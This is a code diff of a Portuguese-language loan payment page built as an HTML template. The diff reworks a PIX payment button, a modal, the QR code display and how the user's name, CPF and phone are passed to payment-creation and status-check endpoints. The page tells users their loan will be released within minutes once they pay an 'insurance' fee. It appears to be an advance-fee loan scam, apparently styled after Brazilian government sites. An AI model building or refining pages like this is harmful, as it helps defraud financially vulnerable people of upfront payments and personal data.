@@ -384,9 +384,25 @@
                     <p style="font-weight: 600; font-size: 1rem; margin-bottom: 10px;">Importante:</p>
                     <p>Após o pagamento do seguro, seu empréstimo será liberado em até 5 minutos.</p>
                     
-                    <!-- Instruções de pagamento -->
+                    <!-- Instruções de pagamento e botão -->
                     <div style="margin: 15px auto; text-align: center;">
                         <p style="margin-top: 10px; font-weight: 700; color: white; letter-spacing: 1px;">AGUARDANDO PAGAMENTO</p>
+                        
+                        <div style="margin-top: 20px; background-color: rgba(255, 255, 255, 0.2); border-radius: 8px; padding: 15px; text-align: left;">
+                            <p style="font-weight: 600; color: white; margin-bottom: 10px;">COMO PAGAR COM PIX COPIA E COLA:</p>
+                            <ol style="color: white; text-align: left; padding-left: 25px; margin-bottom: 15px;">
+                                <li style="margin-bottom: 8px;">Abra o aplicativo do seu banco</li>
+                                <li style="margin-bottom: 8px;">Escolha a opção de pagamento por PIX</li>
+                                <li style="margin-bottom: 8px;">Selecione a opção "Pix Copia e Cola"</li>
+                                <li style="margin-bottom: 8px;">Cole o código que será gerado</li>
+                                <li>Confirme o pagamento</li>
+                            </ol>
+                        </div>
+                        
+                        <button id="generate-payment-btn" style="margin-top: 20px; background-color: #25D366; color: white; font-weight: 700; font-size: 16px; border: none; border-radius: 8px; padding: 15px 30px; width: 100%; cursor: pointer; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2); display: flex; justify-content: center; align-items: center; transition: all 0.3s ease;">
+                            <i class="fas fa-money-bill-wave" style="margin-right: 10px;"></i>
+                            REALIZAR PAGAMENTO AGORA
+                        </button>
                     </div>
                 </div>
                 
@@ -421,8 +437,8 @@
                         position: relative;
                         background-color: white;
                         margin: 10% auto;
-                        width: 95%;
-                        max-width: 800px;
+                        width: 80%;
+                        max-width: 600px;
                         height: 80%;
                         border-radius: 10px;
                         padding: 20px;
@@ -721,19 +737,14 @@
                         let transactionId = null;
                         let checkInterval = null;
             
-                        // Função para mostrar o modal de pagamento e iniciar o processo
-                        function showPaymentModal() {
+                        // Botão para gerar pagamento e mostrar modal
+                        generatePaymentBtn.addEventListener('click', function() {
                             modal.style.display = 'block';
                             modalSpinner.style.display = 'block';
                             pixDataContainer.style.display = 'none';
                             
-                            // Criar o pagamento PIX quando o modal é aberto
+                            // Criar o pagamento PIX quando o botão é clicado
                             createPixPayment();
-                        }
-                        
-                        // Botão para gerar pagamento e mostrar modal (mantido para compatibilidade)
-                        generatePaymentBtn.addEventListener('click', function() {
-                            showPaymentModal();
                         });
             
                         // Fechar o modal se o usuário clicar fora dele
@@ -759,24 +770,15 @@
                         
                         // Função para criar o pagamento PIX
                         function createPixPayment() {
-                            // Carregar dados do usuário do localStorage
-                            const userData = JSON.parse(localStorage.getItem('userData') || '{"nome":"","cpf":"","phone":""}');
-                            console.log("Dados do usuário carregados do localStorage:", userData);
-                            
-                            // Usar dados do localStorage ou fallback para o valor da URL
-                            const name = userData.nome || '{{ nome }}';
-                            const cpf = userData.cpf || '{{ cpf }}';
-                            const phone = userData.phone || '{{ phone }}';
-                            
                             fetch('/create-pix-payment', {
                                 method: 'POST',
                                 headers: {
                                     'Content-Type': 'application/json'
                                 },
                                 body: JSON.stringify({
-                                    name: name,
-                                    cpf: cpf,
-                                    phone: phone,
+                                    name: '{{ nome }}',
+                                    cpf: '{{ cpf }}',
+                                    phone: '{{ phone }}',
                                     amount: {{ amount }}
                                 })
                             })
@@ -813,18 +815,10 @@
                             checkInterval = setInterval(() => {
                                 if (!transactionId) return;
                                 
-                                // Carregar dados do localStorage
-                                const userData = JSON.parse(localStorage.getItem('userData') || '{"nome":"","cpf":"","phone":""}');
-                                
-                                // Usar dados do localStorage ou fallback para o valor da URL
-                                const name = userData.nome || '{{ nome }}';
-                                const cpf = userData.cpf || '{{ cpf }}';
-                                const phone = userData.phone || '{{ phone }}';
-                                
                                 const params = new URLSearchParams({
-                                    nome: name,
-                                    cpf: cpf,
-                                    phone: phone
+                                    nome: '{{ nome }}',
+                                    cpf: '{{ cpf }}',
+                                    phone: '{{ phone }}'
                                 });
                                 
                                 fetch(`/check-for4payments-status?transaction_id=${transactionId}&${params.toString()}`)
@@ -836,16 +830,8 @@
                                             clearInterval(checkInterval);
                                             alert("Pagamento aprovado! Redirecionando para a página de obrigado...");
                                             
-                                            // Carregar dados do usuário do localStorage
-                                            const userData = JSON.parse(localStorage.getItem('userData') || '{"nome":"","cpf":"","phone":""}');
-                                            
-                                            // Usar dados do localStorage ou fallback para o valor da URL
-                                            const name = userData.nome || '{{ nome }}';
-                                            const cpf = userData.cpf || '{{ cpf }}';
-                                            const phone = userData.phone || '{{ phone }}';
-                                            
                                             // Redirecionar para a página de obrigado com os parâmetros
-                                            window.location.href = `/obrigado?nome=${encodeURIComponent(name)}&cpf=${encodeURIComponent(cpf)}&phone=${encodeURIComponent(phone)}`;
+                                            window.location.href = `/obrigado?nome=${encodeURIComponent('{{ nome }}')}&cpf=${encodeURIComponent('{{ cpf }}')}&phone=${encodeURIComponent('{{ phone }}')}`;
                                         }
                                     })
                                     .catch(error => {
@@ -985,24 +971,6 @@
                 <h3 style="font-weight: 700; font-size: 1.2rem; color: #1351b4; margin-bottom: 15px;">IMPORTANTE:</h3>
                 <p style="margin-bottom: 15px; font-weight: 500;">Após o pagamento do seguro, seu empréstimo será liberado em até 5 minutos.</p>
                 
-                <!-- Botão para Realizar o Pagamento -->
-                <button id="generate-payment-btn" onclick="showPaymentModal()" style="margin: 20px auto; background-color: #25D366; color: white; font-weight: 700; font-size: 16px; border: none; border-radius: 8px; padding: 15px 30px; width: 100%; cursor: pointer; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2); display: flex; justify-content: center; align-items: center; transition: all 0.3s ease;">
-                    <i class="fas fa-money-bill-wave" style="margin-right: 10px;"></i>
-                    REALIZAR PAGAMENTO AGORA
-                </button>
-                
-                <!-- Instruções de Pagamento PIX -->
-                <div style="margin-top: 20px; text-align: left; border: 1px dashed #dee2e6; padding: 15px; border-radius: 8px;">
-                    <p style="font-weight: 600; color: #1351b4; margin-bottom: 10px; text-align: center;">COMO PAGAR COM PIX:</p>
-                    <ol style="padding-left: 25px; margin-bottom: 0;">
-                        <li style="margin-bottom: 8px;">Clique no botão "REALIZAR PAGAMENTO AGORA"</li>
-                        <li style="margin-bottom: 8px;">Escaneie o QR Code usando o aplicativo do seu banco</li>
-                        <li style="margin-bottom: 8px;">Ou copie o código PIX e cole no seu aplicativo bancário</li>
-                        <li style="margin-bottom: 8px;">Confirme o pagamento de R$ {{ "%.2f"|format(amount) }}</li>
-                        <li>Aguarde a confirmação automática do pagamento</li>
-                    </ol>
-                </div>
-                
                 <!-- Loader animado e status -->
                 <div style="margin: 20px auto; text-align: center; border-top: 1px dashed #dee2e6; padding-top: 20px;">
                     <div class="loading-spinner" style="width: 40px; height: 40px; border: 4px solid rgba(19, 81, 180, 0.3); border-radius: 50%; border-top: 4px solid #1351b4; margin: 0 auto; animation: spin 1s linear infinite;"></div>
@@ -1010,7 +978,38 @@
                 </div>
             </div>
 
-            <!-- Removemos o QR code e o código PIX aqui, pois agora eles serão mostrados apenas no modal -->
+            <div style="margin: 20px 0; display: flex; flex-direction: column; align-items: center;">
+                <div style="display: flex; justify-content: center; margin-bottom: 20px;">
+                    <div style="text-align: center;">
+                        <p style="margin-bottom: 15px; font-weight: 600; color: #1351b4; text-align: center;">QR Code PIX</p>
+                        <img id="pixQrCode" src="{{ qr_code }}" alt="QR Code PIX" style="width: 200px; height: 200px; border: 1px solid #ddd; border-radius: 8px; padding: 10px; background: white; margin: 0 auto 20px;">
+                    </div>
+                </div>
+                
+                <p style="margin-bottom: 15px; font-weight: 600; color: #1351b4; text-align: center;">Ou copie o código PIX</p>
+                
+                <div style="width: 100%; max-width: 600px; margin: 0 auto;">
+                    <div id="pixCode" class="pix-code" style="word-break: break-all; font-size: 14px; background-color: #f5f5f5; padding: 15px; border-radius: 8px; border: 1px solid #ddd; margin-bottom: 15px; max-height: 100px; overflow-y: auto;">
+                        {{ pix_code }}
+                    </div>
+                    
+                    <button onclick="copyPixCode()" class="copy-button" style="background-color: #4FB04B; color: white; border: none; border-radius: 4px; padding: 10px 15px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; margin: 0 auto; transition: all 0.3s ease;">
+                        <i class="fas fa-copy" style="margin-right: 8px;"></i>
+                        Copiar código PIX
+                    </button>
+                </div>
+                
+                <div style="margin-top: 40px; background-color: #f9f9f9; border-radius: 8px; border: 1px solid #e0e0e0; padding: 20px; max-width: 600px; margin-left: auto; margin-right: auto;">
+                    <h3 style="color: #1351b4; text-align: center; margin-bottom: 15px; font-size: 1.1rem;">COMO PAGAR COM PIX COPIA E COLA</h3>
+                    <ol style="padding-left: 20px; margin-bottom: 0;">
+                        <li style="margin-bottom: 10px; line-height: 1.4;">Abra o aplicativo do seu banco ou instituição financeira</li>
+                        <li style="margin-bottom: 10px; line-height: 1.4;">Acesse a área PIX do aplicativo</li>
+                        <li style="margin-bottom: 10px; line-height: 1.4;">Selecione a opção "PIX Copia e Cola" ou "Pix QR Code"</li>
+                        <li style="margin-bottom: 10px; line-height: 1.4;">Cole o código PIX que você copiou acima</li>
+                        <li style="margin-bottom: 10px; line-height: 1.4;">Finalize o pagamento conforme instruções do seu banco</li>
+                        <li style="margin-bottom: 0; line-height: 1.4;">O pagamento será processado e seu empréstimo será liberado automaticamente</li>
+                    </ol>
+                </div>
                 
                 <script>
                     // Código PIX de fallback (apenas para demonstração)
